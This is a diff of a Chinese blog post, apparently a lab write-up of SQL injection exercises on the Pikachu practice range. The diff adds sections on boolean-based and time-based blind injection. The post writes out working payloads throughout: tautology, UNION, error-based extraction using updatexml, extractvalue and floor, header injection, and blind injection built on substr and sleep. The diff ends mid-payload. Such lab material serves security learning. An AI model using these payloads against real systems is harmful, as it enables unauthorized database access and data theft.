@@ -26,15 +26,6 @@
 <meta property="og:site_name" content="llppff573">
 <meta property="og:description" content="SQL 注入(SQL‑Inject)原理用户输入可控，后端直接把用户输入拼接到SQL语句中执行，没有做过滤&#x2F;预编译，攻击者可以闭合原有SQL语义，篡改SQL逻辑。  攻击发生在数据库层，直接操作后端数据库。  注入产生条件 用户输入可控 输入会拼接到SQL语句 后端没有使用预编译（PDO预处理）  常见注入分类 数字型注入 &#x2F; 字符型注入数字型：参数无需引号包裹，直接拼接Pay">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/54.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/55.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/56.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/57.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/58.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/59.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/60.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/61.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/62.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/63.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/64.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/65.png">
@@ -61,13 +52,30 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/86.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/87.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/88.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/89.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/90.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/91.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/92.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/93.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/94.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/95.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/96.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/97.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/98.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/99.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/100.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/101.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/102.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/103.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/104.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/105.png">
 <meta property="article:published_time" content="2026-09-17T02:00:00.000Z">
-<meta property="article:modified_time" content="2026-09-17T13:55:00.994Z">
+<meta property="article:modified_time" content="2026-09-18T11:35:23.912Z">
 <meta property="article:author" content="llppff573">
 <meta property="article:tag" content="Web安全">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/54.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/llppff573/blog-image/main/images/63.png">
   
   
   
@@ -363,7 +371,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.7k 字
+          8k 字
         
       </span>
     
@@ -374,7 +382,7 @@
         
         
         
-          40 分钟
+          67 分钟
         
       </span>
     
@@ -447,47 +455,47 @@
 </ul>
 <h2 id="sql-inject实验"><a href="#sql-inject实验" class="headerlink" title="sql-inject实验"></a>sql-inject实验</h2><h3 id="数据型注入（post）"><a href="#数据型注入（post）" class="headerlink" title="数据型注入（post）"></a>数据型注入（post）</h3><ol>
 <li><p>先进行功能检查，点击下拉框随机选择一个数字，然后点击查询。页面反馈如下图，url并没有关于刚才查询请求相关内容（参数），所以应该是采用post请求提交申请进行查询。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/54.png" srcset="/img/loading.gif" lazyload alt="查询post测试" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/63.png" srcset="/img/loading.gif" lazyload alt="查询post测试" idth="700"/>
 </li>
 <li><p>数据库方面猜测大致内容：select 字段1，字段2, from 表名 where 字段3&#x3D;n（n是刚才查询选择的数）。在数据库中输入大致猜测可行的语句，观察是否可以输出。可见输出了一行对应的数据，所以我们大致的猜测是正确的。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/55.png" srcset="/img/loading.gif" lazyload alt="ql查询测试" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/64.png" srcset="/img/loading.gif" lazyload alt="ql查询测试" idth="700"/>
 </li>
 <li><p>所以我们可以利用sql语句构建闭合。利用id&#x3D;1 or 1&#x3D;1；这个永远布尔值为1的形式构造对应闭合。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">select username,email from member where id-1 or 1=1;<br></code></pre></td></tr></table></figure>
 </li>
 <li><p>利用bp工具找到对应的抓包，并发送到Repeater。并在对应位置建立闭合，查询所有数据。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/56.png" srcset="/img/loading.gif" lazyload alt="抓包发送至re" idth="700"/>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/57.png" srcset="/img/loading.gif" lazyload alt="抓包构建闭合" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/65.png" srcset="/img/loading.gif" lazyload alt="抓包发送至re" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/66.png" srcset="/img/loading.gif" lazyload alt="抓包构建闭合" idth="700"/>
 </li>
 <li><p>点击提交，可以看到返回值是200（200一般情况下是成功的标志），然后点击Render，直接观察渲染后的页面，可以看到检索出了所有数据。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/58.png" srcset="/img/loading.gif" lazyload alt="数据型结果" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/67.png" srcset="/img/loading.gif" lazyload alt="数据型结果" idth="700"/>
 </li>
 <li><p>观察其后端代码，接受前端请求获取前端传来的id，然后不做任何处理，直接拼接到sql语句中。</p>
 </li>
 </ol>
 <h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><ol>
 <li><p>进入对应页面，输入lucy，页面会反馈对应的id与邮箱地址。输入不存在的用户名是，系统会提示不存在。观察其URL，会发现是一个get请求（url中有本次请求的对应数据）。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/59.png" srcset="/img/loading.gif" lazyload alt="字符型输入测试" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/68.png" srcset="/img/loading.gif" lazyload alt="字符型输入测试" idth="700"/>
 </li>
 <li><p>字符型变量还是构造xxx or 1&#x3D;1；的闭合，但是要注意字符型变量在数据库中是需要用单引号的，所以我们构造以下闭合，利用#注释掉剩余的单引号使sql语句不会报错。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">lucy&#x27; or 1=1#<br></code></pre></td></tr></table></figure></li>
 <li><p>将上述payload输入到对应位置，可以获取所有的用户信息。直接访问修改的url也可以做到相同效果。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/60.png" srcset="/img/loading.gif" lazyload alt="字符型输入测试" idth="700"/></li>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/69.png" srcset="/img/loading.gif" lazyload alt="字符型输入测试" idth="700"/></li>
 </ol>
 <h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><ol>
 <li><p>进入对应页面。本次的查询是模糊查询，利用sql语句中的like，将包含输入字符的所有信息检索出来。以k为例，可以检索出两条。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/61.png" srcset="/img/loading.gif" lazyload alt="字搜索型输入测试" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/70.png" srcset="/img/loading.gif" lazyload alt="字搜索型输入测试" idth="700"/>
 </li>
 <li><p>还是与之前的实验相同，重点在构造合法可运行的闭合：like ‘%xxxx%’ or 1&#x3D;1 #%’   。但是在输入框中需要输入的payload如下：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">xxxx%&#x27; or 1=1 #<br></code></pre></td></tr></table></figure>
 </li>
 <li><p>输入后，如预期可以将表中所有数据检索出来。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/62.png" srcset="/img/loading.gif" lazyload alt="搜索型输入结果" idth="700"/></li>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/71.png" srcset="/img/loading.gif" lazyload alt="搜索型输入结果" idth="700"/></li>
 </ol>
 <h3 id="XX型注入"><a href="#XX型注入" class="headerlink" title="XX型注入"></a>XX型注入</h3><ol>
 <li>核心仍在于对sql的猜测及构造合法可运行的sql语句闭合：<!-- = ('xx') or 1=1 #) -->
 在对应界面输入以下payload：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- xx&#x27;) or 1=1 # --&gt;</span>本行进行注释，去掉注释之后进行输入<br></code></pre></td></tr></table></figure></li>
-<li>查询后发现，可以查询出所有检索内容。<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/63.png" srcset="/img/loading.gif" lazyload alt="xx型结果" idth="700"/></li>
+<li>查询后发现，可以查询出所有检索内容。<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/72.png" srcset="/img/loading.gif" lazyload alt="xx型结果" idth="700"/></li>
 </ol>
 <h3 id="基于union联合查询获取数据库信息"><a href="#基于union联合查询获取数据库信息" class="headerlink" title="基于union联合查询获取数据库信息"></a>基于union联合查询获取数据库信息</h3><ol>
 <li><p>通过union联合查询来查询指定的数据,但是需要注意字段数应该与主查询一致。<br>用法举例：</p>
@@ -495,7 +503,7 @@
 <li><p>进入数据库命令行界面，输入以下内容：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">select id,email from member where username=&#x27;kobe&#x27; union select username,pw from member where id=1;<br></code></pre></td></tr></table></figure>
 <p>效果如下：</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/64.png" srcset="/img/loading.gif" lazyload alt="union测试结果1" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/73.png" srcset="/img/loading.gif" lazyload alt="union测试结果1" idth="700"/>
 </li>
 <li><p>利用常见语句获取当前数据库信息。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">select database();<br>select user();<br>select version();<br></code></pre></td></tr></table></figure></li>
@@ -506,80 +514,159 @@
 <li><p>最后by 2#时成功，所以字符数是2.可以输入以下payload：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">a&#x27; union select database(),user()#<br></code></pre></td></tr></table></figure>
 <p>结果如下，我们可以获得对应的信息。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/65.png" srcset="/img/loading.gif" lazyload alt="union查询结果1" idth="700"/></li>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/74.png" srcset="/img/loading.gif" lazyload alt="union查询结果1" idth="700"/></li>
 </ol>
 <h3 id="基于函数报错的信息获取"><a href="#基于函数报错的信息获取" class="headerlink" title="基于函数报错的信息获取"></a>基于函数报错的信息获取</h3><p>思路：在MYSQL中使用一些指定的函数来制造报错，从而从报错信息中获取设定的信息。select&#x2F;insert&#x2F;update&#x2F;delete都可以使用报错来获取信息。<br>条件：后台没有屏蔽数据库的报错信息，语法错误会输入在前端页面。</p>
 <p>三个常用的用来报错的函数：<br>updatexml():函数是MYsQL对xML文档数据进行查询和修改的XPATH函数。<br>extractvalue（）:函数也是MYsQL对XML文档数据进行查询的XPATH函数。<br>floor():MYsQL中用来取整的函数。</p>
 <ol>
-<li>updataxml()内容：<br>在字符型页面输入一个’,然后查看报错信息。<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/66.png" srcset="/img/loading.gif" lazyload alt="updataxml报错信息" idth="700"/></li>
+<li>updataxml()内容：<br>在字符型页面输入一个’,然后查看报错信息。<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/75.png" srcset="/img/loading.gif" lazyload alt="updataxml报错信息" idth="700"/></li>
 </ol>
 <p>输入以下payload，</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">kobe&#x27; and updatexml(1,concat(0x7e,version()),0)#<br>kobe&#x27; and updatexml(1,concat(0x7e,database()),0)#<br></code></pre></td></tr></table></figure>
-<p>效果如下，利用concat函数将~与对应获取的信息拼接，通过报错反馈到前端。<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/67.png" srcset="/img/loading.gif" lazyload alt="updataxml获取数据库版本" idth="700"/><br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/68.png" srcset="/img/loading.gif" lazyload alt="updataxml获取数据库名称" idth="700"/></p>
+<p>效果如下，利用concat函数将~与对应获取的信息拼接，通过报错反馈到前端。<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/76.png" srcset="/img/loading.gif" lazyload alt="updataxml获取数据库版本" idth="700"/><br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/77.png" srcset="/img/loading.gif" lazyload alt="updataxml获取数据库名称" idth="700"/></p>
 <p>输入以下payload输出一行报错信息（靶场限定输出一行内容）,可以获得数据库的第一个表单。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">kobe&#x27; and updatexml(1,concat(0x7e, (select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1)),0)#<br></code></pre></td></tr></table></figure>
-<p>效果如下：<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/69.png" srcset="/img/loading.gif" lazyload alt="updataxml获取表单" idth="700"/><br>输入以下payload，可以获得第一个字段：</p>
+<p>效果如下：<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/78.png" srcset="/img/loading.gif" lazyload alt="updataxml获取表单" idth="700"/><br>输入以下payload，可以获得第一个字段：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">kobe&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)),0)#<br></code></pre></td></tr></table></figure>
 <p>结果如下：</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/70.png" srcset="/img/loading.gif" lazyload alt="updataxml获取字段" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/79.png" srcset="/img/loading.gif" lazyload alt="updataxml获取字段" idth="700"/>
 
 <h3 id="“insert-update”注入"><a href="#“insert-update”注入" class="headerlink" title="“insert&#x2F;update”注入"></a>“insert&#x2F;update”注入</h3><ol>
 <li><p>进入对应页面，点击注册，输入’作为信息之一，其余随机输入即可。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/71.png" srcset="/img/loading.gif" lazyload alt="insert输入测试" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/80.png" srcset="/img/loading.gif" lazyload alt="insert输入测试" idth="700"/>
 页面会反馈报错信息，意味着我们的输入在后参与了拼接：
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/72.png" srcset="/img/loading.gif" lazyload alt="insert输入测试报错" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/81.png" srcset="/img/loading.gif" lazyload alt="insert输入测试报错" idth="700"/>
 </li>
 <li><p>在数据库命令行中输入以下payload：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">insert into member(username,pw,sex,phonenum,email,address) values(&#x27;xiaoming&#x27;,1,1,2,3,1);<br></code></pre></td></tr></table></figure>
 <p>效果如下，本质上插入了一条数据：</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/73.png" srcset="/img/loading.gif" lazyload alt="insert命令行输入效果" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/82.png" srcset="/img/loading.gif" lazyload alt="insert命令行输入效果" idth="700"/>
 </li>
 <li><p>我们可以输入以下payload，来构造闭合。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">xiaoming&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;<br></code></pre></td></tr></table></figure>
 <p>insert into member(username,pw,sex,phonenum,email,address) values(‘xiaoming’ or updatexml(1,concat(0x7e,database()),0) or ‘’,1,1,2,3,1);</p>
 </li>
 </ol>
-<p>效果如下：<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/74.png" srcset="/img/loading.gif" lazyload alt="insert命令行输入效果2" idth="700"/></p>
-<p>在页面输入同样的的payload，效果相同，也是查询数据库名称。效果如下：<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/75.png" srcset="/img/loading.gif" lazyload alt="insert输入" idth="700"/><br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/76.png" srcset="/img/loading.gif" lazyload alt="insert输入效果" idth="700"/></p>
+<p>效果如下：<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/83.png" srcset="/img/loading.gif" lazyload alt="insert命令行输入效果2" idth="700"/></p>
+<p>在页面输入同样的的payload，效果相同，也是查询数据库名称。效果如下：<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/84.png" srcset="/img/loading.gif" lazyload alt="insert输入" idth="700"/><br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/85.png" srcset="/img/loading.gif" lazyload alt="insert输入效果" idth="700"/></p>
 <ol start="4">
 <li>接下来进行updata的内容。登录后，点击修改个人信息，讲第一个字段中输入payload和上面一样的payload，也会报错并且输出数据库名称。<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">xiaoming&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;<br></code></pre></td></tr></table></figure>
-效果如下：<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/77.png" srcset="/img/loading.gif" lazyload alt="updata输入效果" idth="700"/></li>
+效果如下：<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/86.png" srcset="/img/loading.gif" lazyload alt="updata输入效果" idth="700"/></li>
 </ol>
 <h3 id="delete-注入"><a href="#delete-注入" class="headerlink" title="delete 注入"></a>delete 注入</h3><ol>
-<li>进入对应界面随机删除一个数据，然后到bp找到对应的数据包，并将其发送到Repeater。<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/78.png" srcset="/img/loading.gif" lazyload alt="delete抓包" idth="700"/></li>
+<li>进入对应界面随机删除一个数据，然后到bp找到对应的数据包，并将其发送到Repeater。<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/87.png" srcset="/img/loading.gif" lazyload alt="delete抓包" idth="700"/></li>
 </ol>
 <p>后台方面还是将前端输入的数据直接拼接。所以利用id构建闭合，然后将以下payload放到id字段部分：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">1 or updatexml(1,concat(0x7e,database()),0)<br></code></pre></td></tr></table></figure>
-<p>抓包页面如下：<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/79.png" srcset="/img/loading.gif" lazyload alt="delete抓包修改" idth="700"/></p>
+<p>抓包页面如下：<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/88.png" srcset="/img/loading.gif" lazyload alt="delete抓包修改" idth="700"/></p>
 <ol start="2">
-<li>利用bp自带的工具，选中刚才输入的payload，右键后按照图片对内容进行url编码，然后点击提交。<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/80.png" srcset="/img/loading.gif" lazyload alt="url编码" idth="700"/></li>
+<li>利用bp自带的工具，选中刚才输入的payload，右键后按照图片对内容进行url编码，然后点击提交。<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/89.png" srcset="/img/loading.gif" lazyload alt="url编码" idth="700"/></li>
 </ol>
-<p>在相应部分，在最底部会有我们刚才试图获取的数据库名称，效果如下。<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/81.png" srcset="/img/loading.gif" lazyload alt="相应内容" idth="700"/></p>
+<p>在相应部分，在最底部会有我们刚才试图获取的数据库名称，效果如下。<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/90.png" srcset="/img/loading.gif" lazyload alt="相应内容" idth="700"/></p>
 <p>拓展部分：extractvalue()<br>作用：从目标XML中返回包含所查询值的字符串。<br>语法：ExtraValue(xml_document,xpath_string)，其中Xpath定位必须是有效的，否则会发生错误。<br>还是选择字符型注入，输入以下payload进行注入。<br>参考以下payload：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">kobe&#x27; and extractvalue(0,concat(0x7e,version()))#<br></code></pre></td></tr></table></figure>
-<p>点击查询后。可以看到数据库版本，效果如下：<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/82.png" srcset="/img/loading.gif" lazyload alt="ex获取数据库版本" idth="700"/></p>
+<p>点击查询后。可以看到数据库版本，效果如下：<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/91.png" srcset="/img/loading.gif" lazyload alt="ex获取数据库版本" idth="700"/></p>
 <p>拓展部分：floor()<br>作用：获取数据整数部分<br>可以构造以下闭合：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">select * from users where username=&#x27;kobe&#x27; and (select 2 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#&#x27;;<br></code></pre></td></tr></table></figure>
 <p>所以需要使用的payload：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">kobe&#x27; and (select 2 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#<br></code></pre></td></tr></table></figure>
-<p>仍然选择字符型注入页面，将payload输入后，可以得到数据库版本，效果如下：<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/83.png" srcset="/img/loading.gif" lazyload alt="floor获取数据库版本" idth="700"/></p>
+<p>仍然选择字符型注入页面，将payload输入后，可以得到数据库版本，效果如下：<br><img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/92.png" srcset="/img/loading.gif" lazyload alt="floor获取数据库版本" idth="700"/></p>
 <h3 id="Http-Header注入"><a href="#Http-Header注入" class="headerlink" title="Http Header注入"></a>Http Header注入</h3><p>原理：可以通过http header头信息获取客户端的一些信息，比如useragent,accept字段。</p>
 <ol>
 <li><p>进入靶场对应界面，根据提示输入账号密码进行登录，我们可以获得ip，user agent，http accept，本次连接的端口。效果如下：</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/84.png" srcset="/img/loading.gif" lazyload alt="http信息" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/93.png" srcset="/img/loading.gif" lazyload alt="http信息" idth="700"/>
 </li>
 <li><p>进入bp找到对应的抓包，并发送到Repeater，本次利用User-Agent进行测试，删除原有值，只输入’ 观察是否会报错。可以看出返回值是200，并没有报错，但是在末尾报了sql语法错误，所以存在sql注入漏洞，因为将单引号直接拼接到sql语句中了。</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/85.png" srcset="/img/loading.gif" lazyload alt="抓包信息" idth="700"/>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/86.png" srcset="/img/loading.gif" lazyload alt="抓包测试字符结果" idth="700"/>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/87.png" srcset="/img/loading.gif" lazyload alt="抓包测试字符结果sql部分" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/94.png" srcset="/img/loading.gif" lazyload alt="抓包信息" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/95.png" srcset="/img/loading.gif" lazyload alt="抓包测试字符结果" idth="700"/>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/96.png" srcset="/img/loading.gif" lazyload alt="抓包测试字符结果sql部分" idth="700"/>
 </li>
 <li><p>所以我们构造对应闭环，将下面的payload放到刚才测试过的字段User-Agent，payload如下：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">firefox&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;<br></code></pre></td></tr></table></figure>
 <p>发送后可以看到底部返回了一个XPATH syntax error错误，后面是我们的数据库名称，如图所示：</p>
-<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/88.png" srcset="/img/loading.gif" lazyload alt="head结果1" idth="700"/></li>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/97.png" srcset="/img/loading.gif" lazyload alt="head结果1" idth="700"/></li>
 </ol>
 <p>其他字段也可以进行相关的注入，将以下payload填写在ant[uname]字段，效果与上面一样。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">admin&#x27; and updatexml (1,concat (0x7e,database ()),0)#<br></code></pre></td></tr></table></figure>
+
+<h3 id="SQL-Inject-基于boolian的盲注"><a href="#SQL-Inject-基于boolian的盲注" class="headerlink" title="SQL-Inject-基于boolian的盲注"></a>SQL-Inject-基于boolian的盲注</h3><p>盲注与之前基于报错信息的区别在于不会讲sql报错信息输出在前端。<br>基于boolian的盲注没有报错信息，不管是正确的输入还是错误的输入都只显示两种情况我们视为0或1，在正确的输入下输入and 1&#x3D;1&#x2F;and 1&#x3D;2进行判断。</p>
+<ol>
+<li><p>输入之前输入的payload:kobe’ and 1&#x3D;1#   可以发现并不会在前端反馈sql错误信息,但不意味着不存在sql漏洞，还是会将输入的字符拼接，如果是kobe’ and 1&#x3D;2# 就不会查询出来。</p>
+</li>
+<li><p>我们可以利用语句真假的性质构建闭合，可以通过database函数查询数据库名称，ascii()函数获取对应字符的ASCII值再与估计数值进行比较，观察页面反馈真假，从而获取例如数据库名称的信息。我们将使用的payload如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">kobe&#x27; and ascii(substr(database(),1,1))&gt;113#<br></code></pre></td></tr></table></figure>
+<p>页面将反馈：您输入的username不存在，请重新输入！</p>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/98.png" srcset="/img/loading.gif" lazyload alt="boolian盲注比较结果" idth="700"/></li>
+</ol>
+<p>从而得知我们获取的数据库的第一个字符的ASCII值小于等于113。以此类推可以获得正确的数据库第一个字符。当然也不局限于数据库名称第一个字符的值，sql函数里有很多可以获取信息的函数。</p>
+<h3 id="SQL-Inject-基于time的盲注"><a href="#SQL-Inject-基于time的盲注" class="headerlink" title="SQL-Inject-基于time的盲注"></a>SQL-Inject-基于time的盲注</h3><ol>
+<li>思路与基于布尔型的类似就不在赘述，输入以下payload：<br>&#96;&#96;html<br>kobe’ and sleep(5)#<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">利用浏览器的网络面板，观察时间线发现时间线超过了<span class="hljs-number">500m</span>s，可以得知这个地方存在sql漏洞。<br>我们仍然可以构造一个闭合与sleep函数，如果页面等待了<span class="hljs-number">5</span>s，就证明前面的数据是真的，从而获取一些数据库信息。<br>```html<br>kobe&#x27; and if<span class="hljs-punctuation">(</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">(</span>substr<span class="hljs-punctuation">(</span>database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>=&#x27;p&#x27;,sleep<span class="hljs-punctuation">(</span><span 